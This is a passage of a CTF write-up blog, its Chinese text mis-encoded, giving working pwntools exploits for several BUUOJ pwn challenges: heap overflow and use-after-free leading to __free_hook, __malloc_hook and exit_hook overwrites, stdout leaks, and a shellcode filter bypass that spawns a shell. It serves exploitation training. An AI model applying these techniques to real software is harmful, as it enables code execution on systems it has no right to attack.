overflow</li><li>uaf</li><li>off by one</li></ul><p>ä¸€å †æ´ï¼Œä¼ªä»£ç çœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Œä½†æ˜¯åˆ©ç”¨èµ·æ¥è¾ƒä¸ºç®€å•ã€‚</p><p>é‡ç‚¹æ¼æ´å‡½æ•°åœ¨ updataä¸Šã€‚</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn-2'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29005</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_chapter</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sa(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_section</span><span class="hljs-params">(chapter,name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sa(<span class="hljs-string">'into'</span>,str(chapter))    sa(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_text</span><span class="hljs-params">(section,size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sa(<span class="hljs-string">'into'</span>,str(section))    sla(<span class="hljs-string">'write'</span>,str(size))    sa(<span class="hljs-string">'Text'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_chapter</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_section</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'5'</span>)    sla(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_text</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'6'</span>)    sla(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'7'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(type,name,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'8'</span>)    sla(<span class="hljs-string">'update'</span>,str(type))    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'New'</span>,str(data))sla(<span class="hljs-string">'Name'</span>,<span class="hljs-string">'chumen77'</span> * <span class="hljs-number">4</span>)add_chapter(<span class="hljs-string">'chumen77'</span>)add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'1'</span>)add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'2'</span>)add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'3'</span>)add_text(<span class="hljs-string">'1'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x100</span>)<span class="hljs-comment"># show()</span>add_text(<span class="hljs-string">'2'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'2'</span>*<span class="hljs-number">0x100</span>)del_section(<span class="hljs-string">'1'</span>)del_section(<span class="hljs-string">'2'</span>)show()ru(<span class="hljs-string">'Section:'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_baseadd_text(<span class="hljs-string">'3'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x100</span>)edit(<span class="hljs-string">'Section'</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'3'</span> + <span class="hljs-string">'\x00'</span> + <span class="hljs-string">'1'</span>*(<span class="hljs-number">0x20</span><span class="hljs-number">-2</span>) + <span class="hljs-string">'\xd0'</span>)data = p64(free_hook) + p64(<span class="hljs-number">0x20</span>)edit(<span class="hljs-string">'Text'</span>,<span class="hljs-string">'3'</span>,data)one = libc_base + rce16[<span class="hljs-number">2</span>]edit(<span class="hljs-string">'Text'</span>,<span class="hljs-string">'3'</span>,p64(one))del_chapter(<span class="hljs-string">'chumen77'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="é¢˜è®°-2"><a href="#é¢˜è®°-2" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><ul><li><p>é¢˜æ˜¯ç®€å•é¢˜ï¼Œä½†æ˜¯ç”±äºä»£ç ä¸€å¤šï¼Œä¸”æŒ‡é’ˆçœ‹èµ·æ¥å¤æ‚ï¼Œä¸ªäººåšèµ·æ¥å°±æœ‰ç‚¹æ…¢ï¼Œå¹¶ä¸”è®©è‡ªå·±è¿æœ€ç®€å•çš„heap overflowéƒ½æ²¡æœ‰æƒ³èµ·æ¥å»åˆ©ç”¨ã€‚</p><h4 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h4></li><li><p>å¯¹äºæŒ‡é’ˆå¤æ‚çš„å †ä¿¡æ¯åˆ†é…ï¼Œå¯ä»¥ç›´æ¥gdbä¸Šæ‰‹è°ƒæ¥ç¡®å®šåŸºæœ¬å †ä¿¡æ¯ã€‚</p></li></ul><h2 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a><code>de1ctf_2019_weapon</code></h2><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>uaf</li><li>æœ€å¤§åªèƒ½ç”³è¯·0x60çš„chunk</li><li>æ²¡æœ‰showå‡½æ•°</li><li>éƒ¨åˆ†inputåˆ©ç”¨scanfæ¥è·å–è¯»å…¥</li></ul><h3 id="æ”»å‡»æ€è·¯-5"><a href="#æ”»å‡»æ€è·¯-5" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>free 2ä¸ªchunkï¼Œç„¶åç”¨scanf è¯»å…¥å¤§é‡çš„å­—ç¬¦ï¼Œæ¥è·å–ä¸€ä¸ªsmallbin</li><li>åˆ©ç”¨æ®‹ç•™çš„libcåœ°å€ï¼Œfastbin attck <code>IO_stdout</code>æ¥æ³„æ¼libc</li><li>fastbin attck <code>malloc_hook</code></li></ul><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./de1ctf_2019_weapon'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28987</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size of weapon:'</span>,str(size))    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'new'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">1</span>)    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span> * <span class="hljs-number">0x1000</span>)    add(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,p16(<span class="hljs-number">0xa5dd</span>))    free(<span class="hljs-number">3</span>)    free(<span class="hljs-number">2</span>)    free(<span class="hljs-number">3</span>)    edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\x00'</span>)    add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    <span class="hljs-comment"># debug()</span>    data = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x33</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)    add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,data)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        <span class="hljs-comment"># io = process('./de1ctf_2019_weapon')</span>        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28987</span>)        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_addr = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)malloc_hook = <span class="hljs-number">0x3c4b10</span> + libc_addrfree(<span class="hljs-number">0</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">0</span>)edit(<span class="hljs-number">0</span>,p64(malloc_hook - <span class="hljs-number">0x13</span>))add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)one = rce16[<span class="hljs-number">3</span>] + libc_addrdata = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">3</span> + p64(one)add(<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,data)sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size of weapon:'</span>,<span class="hljs-string">'10'</span>)sla(<span class="hljs-string">'dex'</span>,<span class="hljs-string">'9'</span>)<span class="hljs-comment"># add(9,0x30,'1')</span><span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a><code>starctf_2019_babyshell</code></h2><h3 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¼šæœ‰ä¸€ä¸ªå‡½æ•°æ£€æŸ¥ä½ çš„shellcodeæ˜¯å¦æ»¡è¶³è¦æ±‚ã€‚</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = a1; *i; ++i ) &#123;   <span class="hljs-keyword">for</span> ( j = &amp;unk_400978; *j &amp;&amp; *j != *i; ++j )     ;   <span class="hljs-keyword">if</span> ( !*j )                                  <span class="hljs-comment">// æ£€æŸ¥shellcodeåˆæ³•çš„å‡½æ•°ï¼Œéå†shellcodeçš„æ¯ä¸ªå­—ç¬¦ï¼Œåœ¨0x400987å¤„æ‰¾æ˜¯å¦æœ‰åŒ¹é…ã€‚</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L; &#125; <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;</code></pre></div><p>éœ€è¦0x400987åœ°å€å¤„çš„å­—èŠ‚ç åŒ¹é…ã€‚å€˜è‹¥å‘ç°æœ‰ä¸åŒ¹é…çš„å­—èŠ‚ï¼Œå°±ç›´æ¥checkä¸è¿‡ã€‚</p><p>å¯ä»¥ç”¨çš„æœ‰ <code>pop rdxã€pop rdiã€syscall</code></p><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>æœ‰å¸ˆå‚…çš„åšæ³•ï¼Œå°±æ˜¯ç”¨è¿™3ä¸ªæ±‡ç¼–ï¼Œå¼ºè¡Œå‡‘å‡ºä¸€ä¸ªreadï¼Œç„¶åæŠŠshellcodeå†æ¬¡è¯»åˆ°mmapçš„bufä¸Šåˆé€‚çš„ä½ç½®ï¼ˆæ­¤é¢˜åŠ 12ï¼‰ï¼Œå†æ¬¡è°ƒç”¨åˆ°shellcodeã€‚</p><p><a href="https://www.cnblogs.com/Rookle/p/12895895.html" target="_blank" rel="noopener">https://www.cnblogs.com/Rookle/p/12895895.html</a><br><a href="https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/105863820" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/105863820</a></p><div class="hljs"><pre><code class="hljs undefined">å¯¹äºä¸€äº›å—é™çš„shellcodeï¼Œæˆ‘ä»¬æœ€å¥½çš„åŠæ³•æ˜¯æ„é€ <span class="hljs-built_in">read</span>ç³»ç»Ÿè°ƒç”¨ã€‚</code></pre></div><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>è¿˜æœ‰å°±æ˜¯è¿™ä¸ªå¾ªç¯ï¼Œå…¶å®ç›´æ¥å¯ä»¥ç”¨<code>\x00</code>æˆªæ–­ï¼Œå› ä¸ºå¼€å¤´å¾ªç¯æ¡ä»¶2 ç»™0 ç›´æ¥å°±ä¸æ‰§è¡Œä¸‹é¢çš„æ£€æµ‹å¾ªç¯ï¼Œreturn 1 èµ°äº†ã€‚</p><p><strong>ä½†æ˜¯è·³è¿‡å»éœ€è¦ï¼Œæå‰å†å¸ƒç½®å‡ ä¸ªæœºå™¨ç å­—èŠ‚ä¿è¯ä¸å½±å“ä¸‹é¢çš„shellcodeã€‚</strong></p><p>å¯ä»¥ç›´æ¥åœ¨idaé‡Œé¢è®¾ç½®æ˜¾ç¤ºæœºå™¨ç ï¼Œä»¥åç›´æ¥é€‰å–åˆé€‚çš„æœºå™¨ç æ•´ä¸Šå»å°±å¯ä»¥äº†ã€‚</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">00 </span><span class="hljs-number">5</span>A <span class="hljs-number">5</span>A                    add     [rdx+<span class="hljs-number">5</span>Ah], bl</code></pre></div><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())s(<span class="hljs-string">'\x00'</span>+ <span class="hljs-string">'\x5a'</span> +<span class="hljs-string">'\x00'</span>+ shellcode)</code></pre></div><h3 id="é¢˜è®°-3"><a href="#é¢˜è®°-3" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><p>æ„Ÿè§‰ä¸ªäººshellcodeèƒ½åŠ›è¾ƒå·®ï¼Œå¾—æŠ½æ—¶é—´å­¦ä¹ ä¸‹ã€‚</p><h2 id="hfctf-2020-marksman"><a href="#hfctf-2020-marksman" class="headerlink" title="hfctf_2020_marksman"></a><code>hfctf_2020_marksman</code></h2><h3 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¸Šæ¥ç»™äº†libcåœ°å€ï¼Œå¯ä»¥ä»»æ„åœ°å€3ä¸ªå­—èŠ‚çš„å†™å…¥ã€‚</p><h4 id="éš¾ç‚¹1"><a href="#éš¾ç‚¹1" class="headerlink" title="éš¾ç‚¹1"></a>éš¾ç‚¹1</h4><p>ä¿®æ”¹é‚£é‡Œçš„åœ°å€ï¼Œæ‰èƒ½æ§åˆ¶ç¨‹åºæµç¨‹ã€‚</p><p>å¯ä»¥ä¿®æ”¹<code>exit_hook</code>:<br><a href="https://blog.csdn.net/qq_43116977/article/details/105485947" target="_blank" rel="noopener">https://blog.csdn.net/qq_43116977/article/details/105485947</a><br>å‚è€ƒè¿™é‡Œã€‚</p><p>åœ¨é€€å‡ºæ—¶ï¼š</p><p><code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code></p><p>ä¿®æ”¹<code>__rtld_lock_unlock_recursive</code>æˆ–è€…<code>__rtld_lock_lock_recursive</code>å³å¯ã€‚</p><p><strong>gdb å¿«é€Ÿè·å–è¿™ä¸ªåœ°å€çš„åŠæ³•ï¼š</strong></p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p &amp;<span class="hljs-variable">_rtld_global</span>.<span class="hljs-variable">_dl_rtld_lock_recursive</span></code></pre></div><h4 id="éš¾ç‚¹2"><a href="#éš¾ç‚¹2" class="headerlink" title="éš¾ç‚¹2"></a>éš¾ç‚¹2</h4><p>one gadgetçš„è°ƒæ•´ã€‚</p><p>å…¶ä¸­ <code>one_gadget -lx</code>  è¿™ä¸ªå¯ä»¥è®¾ç½®æ‰«æç­‰çº§è·å–æ›´å¤šçš„one gadgetã€‚</p><p>å¹¶ä¸”åœ¨ç¨‹åºä¸­ï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_BC2</span><span class="hljs-params">(_BYTE *a1)</span></span>&#123;  <span class="hljs-keyword">if</span> ( (*a1 != <span class="hljs-number">0xC5</span>u || a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xF2</span>u) &amp;&amp; (*a1 != <span class="hljs-number">0x22</span> || a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xF3</span>u) &amp;&amp; *a1 != <span class="hljs-number">0x8C</span>u &amp;&amp; a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xA3</span>u )    <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You always want a Gold Finger!"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre></div><p>å¯¹å†™å…¥çš„åœ°å€ä¹Ÿç»™é™åˆ¶äº†ä¸èƒ½å‡ºç°è¿™å‡ ä¸ªå­—èŠ‚ã€‚<br>å…¶ä¸­å°±è®©å¾ˆå¥½çš„:</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x10a38c</span> execve(<span class="hljs-string">"/bin/sh"</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>, environ)<span class="hljs-symbol">constraints:</span>  [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>] == NULL</code></pre></div><p>ä¸è®©å†™å…¥ä½¿ç”¨äº†ã€‚å…¶ä»–çš„å› ä¸ºåœ°å€å°ï¼Œçˆ†ç ´å·®è·å¤§ï¼Œæˆ–è€…é™åˆ¶æ¡ä»¶é«˜ï¼Œä¸é€‚åˆä½¿ç”¨ã€‚</p><p>æƒ³åŠæ³•è°ƒæ•´ä¸€ä¸‹ï¼Œæ¥å®ç°ä¸Šé¢è¿™ä¸ªone gadgetçš„ä½¿ç”¨ã€‚</p><p><a href="http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90" target="_blank" rel="noopener">http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90</a></p><p>å‚è€ƒ taqiniå¸ˆå‚…çš„è¿™ä¸ªæ–‡ç« ï¼Œå‘ç°å…¶ä¸­å°±æœ‰å¯¹è¿™ä¸ªçš„åˆ†æï¼Œå‘ç°æœ€é‡è¦çš„å°±æ˜¯ï¼š<br><code>rsi rdi rdx</code>è¦ç»™æ§åˆ¶å¥½ï¼Œå…¶ä¸­è¿™ä¸ªgadgeté™„è¿‘çš„æ±‡ç¼–å¦‚å›¾æ‰€ç¤º</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/uQchWa.png" srcset="/img/loading.gif" alt></p><p>å…¶ä¸­8cç»“å°¾çš„æ±‡ç¼–ä¹‹åæ˜¯ä¸€å®šè¦æ‰§è¡Œçš„ï¼Œå…¶ä¸­å°±æ§åˆ¶äº†<code>rsi rdi rdx</code>ã€‚å¹¶ä¸”8cè¿™æ¡æ±‡ç¼–ä¹Ÿæ˜¯ä¸å¯ä»¥è·³è¿‡ï¼Œæ§åˆ¶çš„raxï¼Œåœ¨è¿™ä¸ªone gadget ä¸­æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œå¦åˆ™å½“åˆä½œè€…åœ¨å†™è¿™ä¸ªone gadgetæ€ä¹ˆæ²¡æœ‰è·³è¿‡ï¼Œç›´æ¥ä»93ç»“å°¾æ±‡ç¼–å¼€å§‹äº†ã€‚</p><p>å‘ä¸Šçœ‹æœ‰ä¸ªcallæŒ‡ä»¤ï¼Œè¿™æ˜¯å¯¹æ¥ä¸‹æ¥çš„one gadgetæ‰§è¡Œå¹¶æ— é€ æˆé‡è¦å‚æ•°å¤§çš„å½±å“çš„ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•å‘ä¸Šå†™ä¸€ä¸ªåœ°å€ï¼Œè®©è¿™ä¸ªgadgetä»<code>0x10a387</code>å¼€å§‹ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/hDqu69.png" srcset="/img/loading.gif" alt><br>æ‰§è¡Œä¸‹å»å‘ç°æ˜¯å¯ä»¥æ»¡è¶³<code>execve(&quot;/bin/sh&quot;, 0, environ)</code>çš„ã€‚</p><p>æ­¤é¢˜ä¸­å¯¹äºexit hook çš„æ”¹å†™ä¸­ï¼Œ<code>_dl_rtld_lock_recursive</code> å¯ä»¥å®Œæˆæ¡ä»¶çš„æ»¡è¶³ã€‚<code>_dl_rtld_unlock_recursive</code>ä¸å¯ä»¥ã€‚<br>å…·ä½“è·Ÿè¿‡å»ä¼šå‘ç°æ˜¯åœ¨ç¬¬2å’Œå‚æ•°å‡ºäº†é—®é¢˜ï¼Œä¸”åœ¨one gadgetä¸­ç¬¬äºŒä¸ªå‚æ•°çš„æ§åˆ¶å¾ˆç„å­¦ï¼Œä¸”å¾ˆéš¾æ§åˆ¶ï¼Œè®©äººå¤´å¤§ã€‚</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)exit_hook = <span class="hljs-number">0x81df60</span> + libc_baseone = <span class="hljs-number">0x10a387</span> + libc_base<span class="hljs-comment"># debug()</span>sl(str(exit_hook))sla(<span class="hljs-string">'biang'</span>,chr((one  &amp;<span class="hljs-number">0xff</span>)))sla(<span class="hljs-string">'biang!'</span>,chr((one &gt;&gt; <span class="hljs-number">8</span> &amp;<span class="hljs-number">0xff</span>)))sla(<span class="hljs-string">'biang!'</span>,chr((one &gt;&gt; <span class="hljs-number">16</span> &amp;<span class="hljs-number">0xff</span>)))itr()</code></pre></div><h3 id="é¢˜è®°-4"><a href="#é¢˜è®°-4" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><p>å¯¹äºä¿®æ”¹<code>_dl_fini</code>ï¼Œåˆå‘ç°äº†ä¸€ä¸ªå¾ˆå¥½çš„å‚è€ƒé“¾æ¥ï¼š<br><a href="https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1</a></p><h2 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a><code>sctf_2019_easy_heap</code></h2><h3 id="åˆ†æ-9"><a href="#åˆ†æ-9" class="headerlink" 